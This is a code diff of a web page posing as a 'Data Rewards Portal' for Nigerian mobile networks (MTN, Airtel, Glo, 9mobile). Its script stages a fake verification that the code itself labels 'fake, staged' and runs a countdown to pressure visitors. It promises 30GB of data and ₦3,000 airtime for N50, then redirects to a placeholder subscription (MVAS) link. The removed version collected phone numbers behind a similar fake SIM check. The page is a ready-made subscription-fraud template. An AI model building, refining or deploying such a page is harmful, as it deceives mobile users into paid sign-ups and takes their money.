@@ -1,214 +1,308 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Secure Data Verification Portal</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Data Promo Verification</title>
+<meta name="robots" content="noindex,nofollow" />
 <style>
-    body {
-        margin: 0;
-        font-family: "Segoe UI", Arial, sans-serif;
-        background: #f4f7fb;
-        color: #1f2937;
-    }
+  :root{
+    --bg:#0b4fd7;
+    --card:#07224a;
+    --card-2:#0b3f9b;
+    --muted:#bcd3ff;
+    --accent:#ff8a00;
+    --white: #ffffff;
+    --success: #1cc88a;
+    --glass: rgba(255,255,255,0.06);
+    --radius:16px;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;background:linear-gradient(180deg,#0570f0 0%, #05264f 100%);color:var(--white);-webkit-font-smoothing:antialiased}
+  .center{max-width:980px;margin:28px auto;padding:20px}
+  .brand{display:flex;align-items:center;gap:14px}
+  .brand .logo{width:60px;height:60px;border-radius:12px;background:linear-gradient(135deg,#0b74ff,#064bd9);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px}
+  h1{margin:6px 0 0;font-size:20px}
+  p.lead{margin:6px 0 0;color:var(--muted);font-size:14px}
 
-    /* #### POPUP OVERLAY #### */
-    #popup-overlay,
-    #eligibility-modal,
-    #processing-modal {
-        position: fixed;
-        inset: 0;
-        background: rgba(0, 34, 90, 0.55);
-        backdrop-filter: blur(6px);
-        display: none;
-        align-items: center;
-        justify-content: center;
-        z-index: 9999;
-    }
+  /* ---------- Network selection card ---------- */
+  .panel{background:linear-gradient(180deg,#07214b 0%, #03203f 100%);border-radius:18px;padding:22px;margin-top:18px;box-shadow:0 8px 30px rgba(0,0,0,0.35)}
+  .panel h2{margin:0 0 6px;font-size:20px}
+  .panel p{margin:0 0 14px;color:var(--muted);font-size:14px}
+  .grid{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+  .net-btn{background:#0a2a5a;border-radius:12px;padding:18px;display:flex;align-items:center;gap:12px;cursor:pointer;border:2px solid rgba(255,255,255,0.03);transition:transform .14s, box-shadow .14s}
+  .net-btn:hover{transform:translateY(-6px);box-shadow:0 10px 30px rgba(2,6,23,0.45)}
+  .net-swatch{width:56px;height:56px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-weight:800;color:#05122a;font-size:16px}
+  .net-label{font-weight:700}
+  .net-sub{font-size:13px;color:var(--muted)}
 
-    .modal-box {
-        background: #ffffff;
-        width: 90%;
-        max-width: 380px;
-        padding: 24px;
-        border-radius: 14px;
-        text-align: center;
-        box-shadow: 0 4px 20px rgba(0,0,0,0.12);
-    }
+  /* specific swatches */
+  .s-mtn{background:#ffd400}
+  .s-airtel{background:#e60000;color:#fff}
+  .s-glo{background:#0db14b}
+  .s-9m{background:#111111;color:#fff}
 
-    .main-btn {
-        padding: 12px 0;
-        width: 100%;
-        border: none;
-        border-radius: 8px;
-        background: #0066ff;
-        color: #fff;
-        font-size: 16px;
-        font-weight: 700;
-        cursor: pointer;
-        margin-top: 15px;
-    }
+  /* verifying screen */
+  .verify-wrap{display:none;flex-direction:column;align-items:center;gap:18px}
+  .circle{width:92px;height:92px;border-radius:50%;border:6px solid rgba(255,255,255,0.12);display:flex;align-items:center;justify-content:center}
+  .steps{width:100%;max-width:420px;margin-top:6px}
+  .step{display:flex;align-items:center;gap:12px;padding:10px;border-radius:12px;background:linear-gradient(90deg, rgba(255,255,255,0.02), rgba(0,0,0,0.02));margin-bottom:8px}
+  .dot{width:14px;height:14px;border-radius:50%;background:rgba(255,255,255,0.12);flex:0 0 14px;display:inline-block}
+  .dot.done{background:var(--success)}
+  .step-text{font-size:14px;color:var(--muted)}
 
-    .cancel-link {
-        margin-top: 12px;
-        font-size: 13px;
-        cursor: pointer;
-        color: #6b7280;
-    }
+  /* congrats card */
+  .congrats{display:none;flex-direction:column;align-items:center;gap:14px;background:linear-gradient(180deg,#0b3f9b,#08306d);padding:20px;border-radius:16px;box-shadow:0 12px 40px rgba(2,8,32,0.5);max-width:420px;margin:0 auto}
+  .congrats h3{margin:0;font-size:18px}
+  .congrats p{margin:0;font-size:15px;color:var(--muted)}
+  .bonus{font-weight:800;color:var(--white);font-size:15px;margin-top:6px;text-align:center}
+  .claim-btn{background:var(--accent);color:#05122a;padding:12px 22px;border-radius:12px;border:0;font-weight:800;font-size:16px;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,0.28)}
+  .timer{font-size:13px;color:var(--muted);margin-top:6px}
 
-    /* Processing animation */
-    @keyframes spin {
-        to { transform: rotate(360deg); }
-    }
-    .loader {
-        border: 4px solid rgba(255,255,255,0.25);
-        border-top-color: #00a2ff;
-        width: 45px;
-        height: 45px;
-        border-radius: 50%;
-        margin: 0 auto;
-        animation: spin 1s linear infinite;
-    }
+  /* final loading */
+  .final-load{display:none;flex-direction:column;align-items:center;gap:12px}
+  .bar-wrap{width:260px;height:12px;background:rgba(255,255,255,0.12);border-radius:12px;overflow:hidden}
+  .bar{height:100%;width:0;background:linear-gradient(90deg,#4fd3ff,#0077ff);transition:width 0.6s linear}
 
-    /* Network Logo */
-    .net-logo {
-        width: 70px;
-        margin: 10px auto 0 auto;
-    }
+  /* responsive */
+  @media (max-width:520px){
+    .grid{grid-template-columns:1fr}
+    .net-swatch{width:48px;height:48px}
+  }
 </style>
 </head>
 <body>
+  <div class="center">
+    <div class="brand">
+      <div class="logo">D</div>
+      <div>
+        <h1>Data Rewards Portal</h1>
+        <p class="lead">Official-like verification • Secure activation</p>
+      </div>
+    </div>
 
-<!-- =================== PAGE CONTENT (LANDING) =================== -->
+    <!-- NETWORK SELECTION -->
+    <div class="panel" id="selectPanel" role="region" aria-label="Select network">
+      <h2>Select Your Network</h2>
+      <p>Choose the network you are currently using to check promo availability.</p>
 
-<div style="text-align:center; padding:50px;">
-    <h2>Welcome to the Data Eligibility Portal</h2>
-    <p style="color:#555;">Secure verification for discounted data bundles.</p>
-</div>
+      <div class="grid" id="grid">
+        <div class="net-btn" data-net="mtn" tabindex="0">
+          <div class="net-swatch s-mtn">MTN</div>
+          <div>
+            <div class="net-label">MTN</div>
+            <div class="net-sub">Popular</div>
+          </div>
+        </div>
 
+        <div class="net-btn" data-net="airtel" tabindex="0">
+          <div class="net-swatch s-airtel">A</div>
+          <div>
+            <div class="net-label">AIRTEL</div>
+            <div class="net-sub">Fast activation</div>
+          </div>
+        </div>
 
-<!-- =================== STEP 1: POPUP (AUTO LOAD) =================== -->
+        <div class="net-btn" data-net="glo" tabindex="0">
+          <div class="net-swatch s-glo">G</div>
+          <div>
+            <div class="net-label">GLO</div>
+            <div class="net-sub">Value plan</div>
+          </div>
+        </div>
 
-<div id="popup-overlay" style="display:flex;">
-  <div class="modal-box">
-      <h2>⚠️ Verification Required</h2>
-      <p>You are about to access discounted data bundles available for your device and location.</p>
+        <div class="net-btn" data-net="9mobile" tabindex="0">
+          <div class="net-swatch s-9m">9</div>
+          <div>
+            <div class="net-label">9MOBILE</div>
+            <div class="net-sub">Newer users</div>
+          </div>
+        </div>
+      </div>
+    </div>
 
-      <button id="continueBtn" class="main-btn">Continue</button>
-      <p id="closePopup" class="cancel-link">Maybe later</p>
-  </div>
-</div>
-
-
-<!-- =================== STEP 2: PHONE ENTRY =================== -->
-
-<div id="eligibility-modal">
-  <div class="modal-box">
-      <h2>Verify SIM Eligibility</h2>
-      <p>Please enter your phone number to check eligibility.</p>
-
-      <input id="phoneInput" type="tel"
-          placeholder="e.g. 08123456789"
-          style="width:100%; padding:12px; border-radius:8px; border:1px solid #d1d5db; font-size:15px;">
-
-      <img id="networkLogo" class="net-logo" style="display:none;">
-
-      <p id="networkDisplay" style="font-size:14px; font-weight:600; color:#0066ff;"></p>
-
-      <button id="checkBtn" class="main-btn">Check Eligibility</button>
-      <p id="closeEligibility" class="cancel-link">Cancel</p>
-  </div>
-</div>
-
-
-<!-- =================== STEP 3 + 4: PROCESSING + RESULT =================== -->
-
-<div id="processing-modal">
-  <div class="modal-box" style="background:#00225a; color:white;">
-      <div id="processingStage">
-          <div class="loader"></div>
-          <p id="processingText" style="margin-top:12px;">Checking eligibility...</p>
+    <!-- VERIFYING / PROGRESS -->
+    <div id="verifyPanel" class="verify-wrap" role="status" aria-live="polite">
+      <div class="circle" id="verifyCircle">
+        <svg width="42" height="42" viewBox="0 0 24 24" fill="none"><path d="M12 2v6" stroke="rgba(255,255,255,0.85)" stroke-width="1.6" stroke-linecap="round"/><path d="M12 22v-6" stroke="rgba(255,255,255,0.85)" stroke-width="1.6" stroke-linecap="round"/></svg>
+      </div>
+      <div style="text-align:center">
+        <div style="font-weight:800;font-size:18px">Verifying Your Connection... please wait</div>
+        <div style="color:var(--muted);margin-top:6px;font-size:14px">We're running a quick check to confirm eligibility</div>
       </div>
 
-      <div id="successStage" style="display:none;">
-          <h2>✅ SIM Eligible</h2>
-          <p>Your SIM qualifies for discounted data activation.</p>
-          <button id="activateBtn" class="main-btn" style="background:#00c851;">Activate Now</button>
+      <div class="steps" id="stepsWrap" aria-hidden="false">
+        <div class="step" id="step-a"><span class="dot" id="dot-a"></span><div class="step-text">Verifying Network Carrier</div></div>
+        <div class="step" id="step-b"><span class="dot" id="dot-b"></span><div class="step-text">Checking Country</div></div>
+        <div class="step" id="step-c"><span class="dot" id="dot-c"></span><div class="step-text">Checking IP Address</div></div>
       </div>
-  </div>
-</div>
+    </div>
 
+    <!-- CONGRATS -->
+    <div id="congratsPanel" class="congrats" role="region" aria-label="Congratulations" style="margin-top:20px">
+      <h3>🎉 Congratulations! You are qualified</h3>
+      <p style="color:var(--muted);margin-top:6px">You will get:</p>
+      <div class="bonus">30GB of data + ₦3,000 Airtime when you subscribe for N50.</div>
+
+      <button id="claimBtn" class="claim-btn">Loading... ⟳</button>
+      <div class="timer">Claim Promo in (<span id="countdown">02:35</span>)</div>
+    </div>
+
+    <!-- FINAL LOADING -->
+    <div id="finalPanel" class="final-load" style="margin-top:26px">
+      <div style="font-weight:800;font-size:17px">Loading… please wait</div>
+      <div class="bar-wrap" aria-hidden="false"><div id="progressBar" class="bar"></div></div>
+    </div>
+  </div>
 
 <script>
-/* ---- STEP 1 ---- */
-document.getElementById("continueBtn").addEventListener("click", () => {
-    document.getElementById("popup-overlay").style.display = "none";
-    document.getElementById("eligibility-modal").style.display = "flex";
-});
-document.getElementById("closePopup").addEventListener("click", () => {
-    document.getElementById("popup-overlay").style.display = "none";
-});
+  // Configuration
+  const MVAS_LINK = 'YOUR_MVAS_LINK_HERE'; // <-- replace with your MVAS redirect
 
+  // Elements
+  const grid = document.getElementById('grid');
+  const selectPanel = document.getElementById('selectPanel');
+  const verifyPanel = document.getElementById('verifyPanel');
+  const congratsPanel = document.getElementById('congratsPanel');
+  const finalPanel = document.getElementById('finalPanel');
+  const claimBtn = document.getElementById('claimBtn');
+  const countdownEl = document.getElementById('countdown');
+  const progressBar = document.getElementById('progressBar');
 
-/* ---- STEP 2 ---- Auto detect network + show logo */
-document.getElementById("phoneInput").addEventListener("input", function(){
-    let number = this.value.trim();
-    let netText = document.getElementById("networkDisplay");
-    let netLogo = document.getElementById("networkLogo");
+  // countdown start seconds (2:35 = 155s)
+  let countdown = 155;
+  let countdownInterval = null;
 
-    netLogo.style.display = "none";
-    netText.innerHTML = "";
+  // network colors/names (used for minor feedback)
+  const nets = {
+    'mtn': {name:'MTN'},
+    'airtel': {name:'Airtel'},
+    'glo': {name:'Glo'},
+    '9mobile': {name:'9mobile'}
+  };
 
-    const nets = [
-        {regex:/^(0803|0806|0703|0706|0813|0816|0903|0906)/, name:"MTN", logo:"https://i.ibb.co/ZV9f6Lw/mtn.png"},
-        {regex:/^(0802|0808|0708|0812|0902|0907)/, name:"Airtel", logo:"https://i.ibb.co/ThQkYVG/airtel.png"},
-        {regex:/^(0805|0807|0705|0815|0905)/, name:"Glo", logo:"https://i.ibb.co/L8fXjGD/glo.png"},
-        {regex:/^(0809|0817|0818|0909)/, name:"9mobile", logo:"https://i.ibb.co/pJJmGhc/9mobile.png"},
-    ];
+  // Helper to format mm:ss
+  function fmt(sec){
+    const m = Math.floor(sec/60).toString().padStart(2,'0');
+    const s = (sec%60).toString().padStart(2,'0');
+    return `${m}:${s}`;
+  }
 
-    for (let n of nets){
-        if(n.regex.test(number)){
-            netText.innerHTML = "Network: <b>" + n.name + "</b>";
-            netLogo.src = n.logo;
-            netLogo.style.display = "block";
-            break;
-        }
-    }
-});
+  // Start by showing the selection (already visible)
+  // Add click handlers for network buttons
+  document.querySelectorAll('.net-btn').forEach(btn=>{
+    btn.addEventListener('click', () => {
+      const net = btn.getAttribute('data-net');
+      startVerification(net);
+    });
+    btn.addEventListener('keydown', (e) => { if(e.key === 'Enter' || e.key === ' ') { e.preventDefault(); btn.click(); } });
+  });
 
-document.getElementById("closeEligibility").addEventListener("click", ()=>{
-    document.getElementById("eligibility-modal").style.display = "none";
-});
+  // Verification sequence (fake, staged)
+  function startVerification(networkKey){
+    // hide selection
+    selectPanel.style.display = 'none';
+    // show verifying
+    verifyPanel.style.display = 'flex';
 
+    // small UX: display network name on first step text
+    const stepA = document.querySelector('#step-a .step-text');
+    if(networkKey && nets[networkKey]) stepA.textContent = 'Verifying Network Carrier — ' + nets[networkKey].name;
 
-/* ---- STEP 3 ---- Fake verification loading */
-document.getElementById("checkBtn").addEventListener("click", ()=>{
-    let phone = document.getElementById("phoneInput").value;
-    if(phone.length < 11){
-        alert("Please enter a valid phone number.");
+    // run staged checks
+    setTimeout(()=> markDone('dot-a'), 900);
+    setTimeout(()=> markDone('dot-b'), 1700);
+    setTimeout(()=> markDone('dot-c'), 2500);
+
+    // after checks, show congrats
+    setTimeout(()=> {
+      verifyPanel.style.display = 'none';
+      congratsPanel.style.display = 'flex';
+      startCountdown();
+      // animate claim button small pulse to simulate loading
+      pulseClaimButton();
+    }, 3000);
+  }
+
+  function markDone(id){
+    document.getElementById(id).classList.add('done');
+  }
+
+  function startCountdown(){
+    countdownEl.textContent = fmt(countdown);
+    countdownInterval = setInterval(()=>{
+      countdown--;
+      if(countdown <= 0){
+        clearInterval(countdownInterval);
+        countdownEl.textContent = '00:00';
+        // auto-enable claim if desired (we'll keep the button clickable anyway)
+      } else {
+        countdownEl.textContent = fmt(countdown);
+      }
+    }, 1000);
+  }
+
+  // pulse animation for the orange button (loading feel)
+  function pulseClaimButton(){
+    claimBtn.animate([
+      { transform: 'translateY(0)', boxShadow: '0 10px 24px rgba(0,0,0,0.15)' },
+      { transform: 'translateY(-6px)', boxShadow: '0 18px 40px rgba(0,0,0,0.22)' },
+      { transform: 'translateY(0)', boxShadow: '0 10px 24px rgba(0,0,0,0.15)' }
+    ], { duration: 1600, iterations: Infinity });
+  }
+
+  // Claim button click -> final loading -> redirect
+  claimBtn.addEventListener('click', ()=>{
+    // stop countdown
+    if(countdownInterval) clearInterval(countdownInterval);
+    // hide congrats, show final load
+    congratsPanel.style.display = 'none';
+    finalPanel.style.display = 'flex';
+    // animate progress bar to 100% over 2.6s
+    progressBar.style.width = '0%';
+    setTimeout(()=> progressBar.style.width = '22%', 50);
+    setTimeout(()=> progressBar.style.width = '58%', 700);
+    setTimeout(()=> progressBar.style.width = '88%', 1400);
+    setTimeout(()=> progressBar.style.width = '100%', 2000);
+    // after full load, redirect (slight delay for UX)
+    setTimeout(()=> {
+      // For safety: if MVAS_LINK not replaced, don't redirect - show final text
+      if(!MVAS_LINK || MVAS_LINK === 'YOUR_MVAS_LINK_HERE') {
+        // show message and stop
+        progressBar.style.width = '100%';
+        finalPanel.querySelector('div').textContent = 'Ready — MVAS link not set';
+        // you can replace above with redirect once you add your link
         return;
+      }
+      window.location.href = MVAS_LINK;
+    }, 2400);
+  });
+
+  // Accessibility: allow keyboard escape to go back to selection (optional)
+  document.addEventListener('keydown', (e)=>{
+    if(e.key === 'Escape') {
+      // reset and show selection
+      resetAll();
     }
+  });
 
-    document.getElementById("eligibility-modal").style.display = "none";
-    document.getElementById("processing-modal").style.display = "flex";
+  function resetAll(){
+    // hide everything except selection
+    verifyPanel.style.display = 'none';
+    congratsPanel.style.display = 'none';
+    finalPanel.style.display = 'none';
+    // reset dots
+    ['dot-a','dot-b','dot-c'].forEach(id=> document.getElementById(id).classList.remove('done'));
+    // show select
+    selectPanel.style.display = 'block';
+    // reset countdown
+    if(countdownInterval) clearInterval(countdownInterval);
+    countdown = 155;
+    countdownEl.textContent = fmt(countdown);
+  }
 
-    let text = document.getElementById("processingText");
-
-    setTimeout(()=> text.innerText = "Verifying SIM...", 900);
-    setTimeout(()=> text.innerText = "Checking available data slot...", 1800);
-    setTimeout(()=>{
-        document.getElementById("processingStage").style.display = "none";
-        document.getElementById("successStage").style.display = "block";
-    }, 2600);
-});
-
-
-/* ---- STEP 4 ---- Redirect to MVAS page */
-document.getElementById("activateBtn").addEventListener("click", ()=>{
-    window.location.href = "YOUR_MVAS_LINK_HERE";  // <<< replace this
-});
+  // For safety, allow starting again by clicking brand logo
+  document.querySelector('.logo').addEventListener('click', resetAll);
 </script>
-
 </body>
 </html>
